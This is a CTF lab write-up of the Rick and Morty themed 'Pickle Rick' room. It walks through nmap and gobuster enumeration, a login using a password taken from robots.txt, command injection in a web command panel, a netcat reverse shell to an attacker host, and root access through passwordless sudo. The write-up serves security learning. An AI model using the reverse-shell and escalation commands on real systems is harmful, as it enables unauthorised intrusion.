
# Pickle Rick Write-up

![Picture of the room](/Easy_rooms/Pickle-Rick/Screenshots/00_Room.png)


"I TURNED MYSELF INTO A PICKLE MORTY, IM PICKLE RICK!!!",
And welcome to another write-up. As the description of the room already mentioned, this is a Rick and Morty based CTF, one of my favorite shows actually! We will need to exploit a web application and find the three ingredients to turn Rick back into a Human. Let's don't waste anymore time and boot these machines!

## Investigating the Web Application

Before we can exploit anything, we will need to collect some information about the host we are targeting. I like to start with a quick but still important Nmap scan

```bash
nmap -sC -sV -sS TARGET_IP
```

![Nmap result](/Easy_rooms/Pickle-Rick/Screenshots/01_Nmap-scan.png)

Sadly nothing interesting there, just ssh, but this will only be valuable if we find valid credentials or a key. Brute forcing might work but that would take some time and for this, we are only focusing on the web application itself! I also tried adding the `-p-` flag to the scan, but I got the same results. 
Instead, let's visit the website!

![Webpage](/Easy_rooms/Pickle-Rick/Screenshots/02_Webpage.png)

Rick forgot his password and is asking us to logon to his computer, so if we find any credentials, we will probably need to SSH into the machine and investigate it to find the three ingredients I am guessing. I like to start viewing the Source code of the website in such CTFs challenges, especially when the page doesn't have that much content like this one

![Web Source](/Easy_rooms/Pickle-Rick/Screenshots/03_Source-code.png)

Bingo! We found a username! Now all we need is a password. There is nothing on the page to interact with, so this kills all client side vulnerabilities. I checked the Network tab in the dev tools as well to see if there were any hidden requests being made which I might be able to manipulate. This might look like a dead end, but we have plenty other options. When I hit a dead end like that, I like to try using **Gobuster** as a way of enumeration to find hidden directories or Subdomains. I tried the following command which runs Gobuster in Directory mode and uses a common wordlist to search for directories or any hidden files

```bash
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x .php.txt
```

![Dirbuster results](/Easy_rooms/Pickle-Rick/Screenshots/04_Gobuster-enum.png)

You'd love to see it, there are plenty hidden directories accessible to the public! Let's see what's there. The Robots.txt file just contains a reference to the show, and every other Directory redirected me to the /login.php one. 

![Login page](/Easy_rooms/Pickle-Rick/Screenshots/05_Hidden-dir.png)

## Gaining access to the system

We already got a Username, but not a password. I actually wanted to try an SQL injection first, but out of curiosity, I wanted to try the line from the`/robots.txt` directory, as it usually contains valuable information which shouldn't be accessible to everyone. I thought it was just a reference to Ricks iconic catchphrase, but turns out that was his password! Maybe an SQL injection works, feel free to try it before you enter the password from the `/robots.txt` file.

![Portal page](/Easy_rooms/Pickle-Rick/Screenshots/06_Portal.png)

The first thing that should catch your eye immediately is the commands Panel option, we can do so much damage with that if we can really enter every command we want. The other pages on the web page aren't accessible for us, only for the real Rick. We should try to see if we can abuse the Command Panel site for Command injection. We can run commands like `ls`, and it lists a secret file there, but we can't simply `cat` it. I tried to check for a SSTI (Server Side Template Injection) with a command like `<%= 7*7 %>`, but I got no response, so that failed as well. 
What did work though was a reverse shell, so the Command Injection Vulnerability was indeed there, the devs just didn't want you to get the contents of this flag through the web. To actually establish such shell, we first need to know which shell is running on the system. To check that, use this command: `echo $0`

**On your Attacker Machine**
Start a listener on whichever Port is free:
```bash
nc -lvnp 9999
```

**On the Command Panel site**
Enter the following command to trigger a connection to your listener:
```bash
busybox nc YOUR_ATTACKER_MACHINE_IP 9999 -e /bin/sh
```
> To generate such commands for every reverse shell you might need, you can use [Revshells](https://www.revshells.com/)

After that, on the terminal where you started the listener, you should receive a connection

![Established shell](/Easy_rooms/Pickle-Rick/Screenshots/07_Rev-shell.png)

There is also a `clue.txt` file, which suggests we should investigate the file system now. First of all I tried to find every file on the system which contains `.txt` with the following command: 
```bash
find / -type f -name "*.txt" 2>/dev/null
```

However, that gave me a lot of results, so I should've saved everything in a file and use grep to find anything of interest. But then I realized I don't even have the SSH password yet, so I can't even use the secure copy command (`scp`) to copy that file to my machine and analyse it there. I scrapped that idea and did manuell investigation. I checked the `/home` directory to see which users are there. There were two: Rick and Ubuntu. I checked which user I was with `whoami`, and saw I am just logged in as the `www-data` account. The only logical thing for me was to see what's going on in Ricks home directory:

![Ricks Home](/Easy_rooms/Pickle-Rick/Screenshots/08_Rick-home.png)

After that, I was kinda stuck for a while. I tried to look in the Ubuntu folder next and even look for hidden files. There was a `.ssh` file but only the Ubuntu user had permissions for that. So I knew I had to escalate my privileges eventually. You see, I am not that great with privilege escalation yet as I focused more on blue team security, but it's definitely on my agenda to get better at that. Luckily for me, escalating the privileges on that machine wasn't that difficult. I know you have to see which permissions you currently have, that would be the first step to escalate. I checked that with the following command:
```bash
sudo -l
```

![Privileges](/Easy_rooms/Pickle-Rick/Screenshots/09_Privileges.png)

For my surprise, our current user can run every command without needing a password. I guess rick never heard about the principle of least privilege. I looked up how to abuse that for privilege escalation. With these permissions, you can get root access with the following command:

```bash
sudo bash -i
```

![Root Access](/Easy_rooms/Pickle-Rick/Screenshots/10_Root-access.png)

Perfect, this means we can do whatever we want now. Since the Ubuntu user doesn't have anything for our needs, I decided to check other files that I can access now, such as the `/root` directory. And there we have it, the last ingredient

![3rd Ingredient](/Easy_rooms/Pickle-Rick/Screenshots/11_3rd.png)

## Conclusion

I really liked this room, especially the theme. I feel like this is a great beginner friendly CTF and fun as well. This room made you follow the same steps a penetration tester might perform. First gather information about the target, then try to identify Vulnerabilities. In this room we were able to perform some kind of code injection and used it to gain Remote Code Execution through a reverse shell. After that, enumerate through the file system and escalate your privileges. 
As I am trying to get more into offensive security at the moment, I must say I really appreciated this CTF challenge! 